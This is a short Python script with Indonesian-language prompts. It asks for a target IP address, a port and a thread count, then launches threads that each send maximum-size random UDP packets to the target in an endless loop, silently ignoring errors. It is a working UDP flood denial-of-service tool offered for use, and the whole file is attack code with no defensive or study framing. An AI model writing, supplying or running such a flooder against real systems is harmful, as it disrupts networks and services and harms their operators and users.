import socket
import threading
import random
import time
import requests

target_ip = input("Masukin IP target: ")
target_port = int(input("Masukin Port target: "))
threads = int(input("Jumlah Thread: "))

def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(65507)
            s.sendto(data, (target_ip, target_port))
            s.close()
        except:
            pass

for i in range(threads):
    t = threading.Thread(target=flood)
    t.start()
    print(f"Thread {i+1} ngegas! 💀")
